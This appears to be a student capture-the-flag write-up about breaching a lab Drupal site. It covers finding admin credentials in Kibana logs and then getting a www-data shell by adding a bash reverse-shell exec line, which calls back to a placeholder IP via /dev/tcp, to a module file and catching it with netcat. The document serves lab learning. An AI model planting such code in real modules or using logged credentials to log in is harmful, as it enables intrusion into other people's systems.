    
## Task 2 -  Web access

We had access to the correct Drupal console but not the correct credentials to enter the admin console. The forensics evidence from Kibana contained over 87,000 hits; thus, some filtering was necessary to narrow the search. First, we thought that a great place to start looking for credentials was in the `http POST request` messages. When a user logs in or tries to log in, an http POST request is sent, and a successful or unsuccessful response is received. Then, after adding the filter `http.request.method: POST` we were left with 19 hits. 

When looking through some of them, we noticed that several of them tried to access the `user/login` page and thought that this filter might give us a narrow search. As seen below, adding the filter `http.request.headers.referer: http://10.13.37.4/user/login` left us with just three hits. 

 ![image](https://user-images.githubusercontent.com/72946914/167696514-2b4ac726-2db8-4f0f-b37b-3dca1585a008.png)

The attacker tried three different passwords, and most likely, his last attempt was the successful one. By checking the `http.response` message in this record, we see that the user was redirected to `http://10.13.374/user/1?check_logged_in=1`, indicating that the attempt was successful. 
![image](https://user-images.githubusercontent.com/72946914/167710984-476f3164-8e7f-4858-a15c-86fac3a04cf3.png)

Our thought was confirmed when entering the username *god* and password *password1* caused a successful login. 
![image](https://user-images.githubusercontent.com/72946914/164683204-efd1c930-bdf7-4b6b-931f-da415ef65e74.png)

Navigating to the user's profile information, we located the flag. 

![image](https://user-images.githubusercontent.com/72946914/167711169-60189d5c-6df1-491f-8c19-5738fe0c1425.png)

**`Flag: IKT449{admin_access=god}`**

## Task 3 - www-data

We already knew that we had to use the reverse shell technique to get interactive access to www-data, which could also be seen in the logs from Kibana. By investigating the hits from the previous task, we also saw that the Drupal version running at this site was Drupal 9. 

With a quick Google search at "drupal 9 reverse shell" we found several websites explaining the way forward for carrying out this attack. Several Drupal versions are vulnerable to remote code execution due to insecure use of `unserialize()` [(source)](https://vk9-sec.com/drupal-7-x-module-services-remote-code-execution/). One of the sites we found [(link)](https://www.sevenlayers.com/index.php/257-drupal-8-to-reverse-shell) provided us with a well-explained step-by-step guide which we benefitted from. 

The guide describes how one can exploit the use of modules in Drupal by inserting code into a `.module` file. At Drupal's website, we downloaded a random module compatible with Drupal 9, in this case, called *token*. 

![image](https://user-images.githubusercontent.com/70077872/167573879-1302944a-d324-45a6-800e-147cb45be604.png)

After unzipping the module, we added the following code line, with our designated IP address and the desired port number, to the file called `codefilter.module` : 

    exec("/bin/bash -c 'bash -i >& /dev/tcp/ip_address/portnumber 0>&1'");
![image](https://user-images.githubusercontent.com/70077872/167573750-8dca4946-dd94-4f2d-8923-ecbda7b62a48.png)

 At the same time, we started a port listener in a terminal window by executing the command `nc -nvlp port number. 


After uploading the module, enabling it and installing it, we got a shell to www-data. 

![image](https://user-images.githubusercontent.com/70077872/167573128-1848a4ee-8881-4bbb-96e2-9aabb47cfe50.png)

We found the flag in `www-data.txt`.

![image](https://user-images.githubusercontent.com/70077872/167573357-162e2f3f-67d6-414f-bfb7-b871ac042453.png)

**`Flag: IKT449{who_would_have_thought_adding_modules_is_bad}`**
